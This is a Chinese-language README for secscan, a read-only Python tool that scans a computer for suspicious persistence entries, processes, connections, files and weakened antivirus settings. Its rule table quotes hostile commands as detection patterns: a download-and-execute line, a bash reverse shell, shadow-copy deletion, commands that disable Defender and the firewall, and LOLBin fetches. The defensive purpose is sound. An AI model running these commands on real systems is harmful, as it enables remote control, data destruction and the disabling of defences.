# secscan：本機安全掃描工具

掃描你的電腦，把**有疑慮**的東西列出來：可疑檔案、開機自動執行的程式、執行中的程序、對外連線，以及防毒軟體本身有沒有被關掉或動手腳。

- **只讀取、不刪除、不修改**任何東西。要不要處理由你決定。
- 只用 Python 標準函式庫，**不用安裝任何套件**（有裝 `psutil` 會自動使用，結果更完整）。
- 主要針對 **Windows 10/11**，Linux 與 macOS 也能用。
- 輸出終端機摘要 + 可篩選的 **HTML 報告**（亦可輸出 JSON）。

> ⚠️ 這是「可疑項目檢查」工具，用特徵與經驗法則判斷，**不是**防毒軟體的替代品。被列出 ≠ 一定是病毒；沒被列出 ≠ 一定安全。

## 快速開始（Windows）

1. 安裝 Python 3.8 以上：`winget install --id Python.Python.3.12`
2. **雙擊 `scan.cmd`**
   - 會要求系統管理員權限（讀 Defender 排除清單、所有程序需要）
   - 跑完自動開啟 `reports\scan-日期時間.html`

或在命令列：

```
scan.cmd                         快速掃描（常見藏毒位置）
scan.cmd --full                  掃描所有本機磁碟（較慢）
scan.cmd --path D:\Downloads     只掃指定資料夾
scan.cmd --checks protection     只看防毒／防火牆狀態（幾秒鐘）
```

Linux / macOS：`sudo ./scan.sh`（或 `python3 -m secscan --html report.html`）

## 檢查了什麼

### 1. 防護狀態（防毒系統本身有沒有問題）

| 檢查 | 為什麼 |
|---|---|
| Windows 資訊安全中心登記的防毒軟體、是否啟用、病毒碼是否最新 | 惡意程式常先關掉防毒 |
| Defender 即時保護／行為監控／下載掃描是否被關閉 | 同上 |
| Defender 病毒碼超過 7 天沒更新 | 更新可能被阻擋 |
| **Defender 排除清單**（路徑、副檔名、程式） | 惡意程式最愛把自己加進排除清單。排除整顆 C 槽、Temp、AppData、`.exe` 會列為「高」 |
| Defender 偵測紀錄（`Get-MpThreat`），尤其是**仍在活動中**的威脅 | Defender 抓到但沒清掉 |
| 竄改防護、PUA 封鎖 | 建議開啟的設定 |
| 防火牆是否關閉、UAC 是否被關閉 | |
| **hosts 檔**是否把防毒／Windows Update 網站導走、把銀行／常用網站導到其他 IP | 阻擋更新、釣魚 |
| Linux：是否有 ClamAV 等工具、SSH 是否允許 root／空白密碼；macOS：Gatekeeper、SIP | |

### 2. 開機自動執行（惡意程式最常藏的地方）

- 登錄檔 `Run` / `RunOnce` / `Policies\Explorer\Run`（HKCU、HKLM、32 位元）
- `Winlogon` 的 Shell / Userinit 被竄改
- **IFEO 偵錯器劫持**、SilentProcessExit、AppInit_DLLs
- 啟動資料夾（含 `.lnk` 捷徑內容分析）
- 排程工作（非 Microsoft 的全部列出，隱藏工作加分）
- 系統服務（可疑路徑、未加引號的服務路徑）
- **WMI 事件訂閱**（無檔案持久化手法）
- Linux：crontab、systemd、`.bashrc` 等、`/etc/ld.so.preload`、autostart、SSH 授權金鑰；macOS：LaunchAgents / LaunchDaemons

每一項都會分析指令內容（見下方規則）、執行檔位置與數位簽章。沒有可疑跡象的項目以「資訊」列出，方便你核對清單（HTML 報告預設隱藏，點「資訊」方塊即可顯示）。

### 3. 執行中程序

- 執行檔在暫存資料夾、下載資料夾、`AppData\Roaming`、`C:\Users\Public`、資源回收筒等位置
- **偽裝成系統程式**：`svchost.exe` 不在 System32、或故意拼錯（`svch0st.exe`、`lsasss.exe`）
- **Word / Excel / Outlook 啟動 cmd、PowerShell、mshta…**（惡意巨集的典型行為）
- 指令列含有惡意特徵（例如 `powershell -w hidden -enc …`）
- Linux：執行檔已被刪除、偽裝成核心執行緒

### 4. 網路連線

- 連到**已知惡意 IP**（需提供清單，`--ip-db`）
- 連到常見木馬／挖礦／Tor 連接埠（4444、3333、9050…）
- 可疑位置的程式在對外連線或等待連入

### 5. 檔案

- **病毒碼雜湊比對**：`data/hashes/` 內的清單自動載入；`--update-hashes` 可下載 MalwareBazaar 最新清單
- **偽裝的執行檔**：雙重副檔名（`發票.pdf.exe`）、從右到左隱形字元、`.jpg` 內容其實是 exe
- 可疑位置的執行檔、隱藏檔、高熵值（可能加殼）
- **腳本內容分析**（`.ps1 .bat .vbs .js .hta .lnk .sh …`）
- 含巨集的 Office 文件、內含執行檔的加密壓縮檔、`.iso/.img` 映像檔
- **勒索信**（「your files have been encrypted」「你的檔案已被加密」）
- Windows：批次檢查數位簽章；有效簽章會降低分數，**簽章與內容不符（被竄改）**會大幅加分
- 自動略過 OneDrive「僅線上」檔案（不會觸發下載）

快速掃描範圍：暫存資料夾、下載、桌面、文件、AppData、ProgramData、Public、啟動資料夾、資源回收筒。

### 內容規則

位於 `secscan/rules.py`，每條規則有權重，命中後加總分數：

| 規則 | 例子 |
|---|---|
| PowerShell 編碼／隱藏視窗／繞過執行原則 | `powershell -w hidden -enc SQBFAFgA…` |
| 下載後直接執行 | `IEX (New-Object Net.WebClient).DownloadString(…)` |
| 停用 Defender／AMSI | `Set-MpPreference -DisableRealtimeMonitoring $true` |
| 刪除還原點（勒索軟體） | `vssadmin delete shadows /all` |
| 濫用系統程式（LOLBins） | `certutil -urlcache`、`mshta http://`、`regsvr32 /i:http://` |
| 反向連線 Shell | `bash -i >& /dev/tcp/1.2.3.4/4444` |
| 竊取密碼、挖礦程式 | 憑證傾印工具、`stratum+tcp://` |
| 混淆 | `p^o^w^e^r^s^h^e^l^l`、`[char]73+[char]69…` |
| 清除紀錄、關防火牆、寫入開機機碼 | `wevtutil cl`、`netsh advfirewall set … state off` |

## 嚴重度怎麼算

各跡象權重加總：**≥9 嚴重、≥6 高、≥4 中、≥2 低**，其餘為資訊。符合已知惡意雜湊、EICAR 測試檔、已知惡意 IP 直接列為「嚴重」。

結束代碼：有「高」以上的項目回傳 `3`，否則 `0`（可用於排程或腳本）。

## 常用選項

```
--full                掃描所有本機磁碟
--path 資料夾          指定資料夾（可重複）
--checks a,b          只執行部分檢查：protection,persistence,processes,network,files
--min-severity 等級    終端機只顯示此等級以上（info/low/medium/high/critical，預設 low）
--html 檔案 / --json 檔案
--hash-db 檔案         額外的惡意雜湊清單（每行一個 MD5/SHA1/SHA256）
--ip-db 檔案           惡意 IP 清單（每行一個）
--allowlist 檔案       白名單（預設 allowlist.txt）
--no-signatures       不查 Windows 數位簽章（較快，誤報較多）
-v                    顯示指令列、命中片段、雜湊等細節
--update-hashes       下載 MalwareBazaar 近 48 小時的惡意程式 SHA256
```

## 誤判處理：白名單

把 `allowlist.example.txt` 複製成 `allowlist.txt`，每行一個路徑萬用字元或 SHA256：

```
C:\Users\*\Downloads\my-own-tool.exe
C:\Tools\*
0123456789abcdef...（64 個字元的 SHA256）
```

## 發現可疑項目後怎麼辦

1. **先別急著刪**：右鍵 →「使用 Microsoft Defender 掃描」，或把檔案（或 SHA256）丟到 [VirusTotal](https://www.virustotal.com) 交叉確認。
2. 不認得的開機項目：先在「工作管理員 → 啟動應用程式」停用，觀察幾天。
3. 有「嚴重」項目或 Defender 威脅仍在活動中：**先拔網路**，執行 Defender 離線掃描（Windows 安全性 → 病毒與威脅防護 → 掃描選項 → Microsoft Defender 離線掃描），並從另一台乾淨的裝置更改重要帳號密碼。
4. Defender 排除清單裡有你不認得的項目：Windows 安全性 → 病毒與威脅防護設定 → 排除項目，移除它。

## 測試

```
python -m unittest discover -s tests -t .
```

測試會在暫存資料夾產生假樣本（EICAR 測試字串、偽裝副檔名、惡意腳本片段），結束後刪除。也可以手動驗證：到 [eicar.org](https://www.eicar.org/download-anti-malware-testfile/) 下載 EICAR 測試檔（無害）到「下載」資料夾 —— 如果 Defender 沒擋下來，secscan 應該會把它列為「嚴重」。

> 原始碼中 EICAR 測試字串、AMSI 繞過與密碼竊取工具名稱以 Base64 存放，是為了避免**掃描器本身**被防毒軟體誤刪，不是混淆用途。

## 檔案

| 檔案 | 用途 |
|---|---|
| `scan.cmd` / `scan.sh` | 啟動器：要求管理員權限、輸出並開啟 HTML 報告 |
| `secscan/cli.py` | 命令列入口 |
| `secscan/checks/` | 五項檢查：`protection` `persistence` `processes` `network` `files` |
| `secscan/rules.py` | 腳本／指令列的可疑內容規則 |
| `secscan/scoring.py` | 位置、偽裝系統程式、數位簽章的評分 |
| `secscan/report.py` | 終端機、JSON、HTML 報告 |
| `data/hashes/` | 惡意雜湊清單（自動載入） |
| `allowlist.example.txt` | 白名單範例 |
| `reports/` | 報告輸出（不進版本控制） |
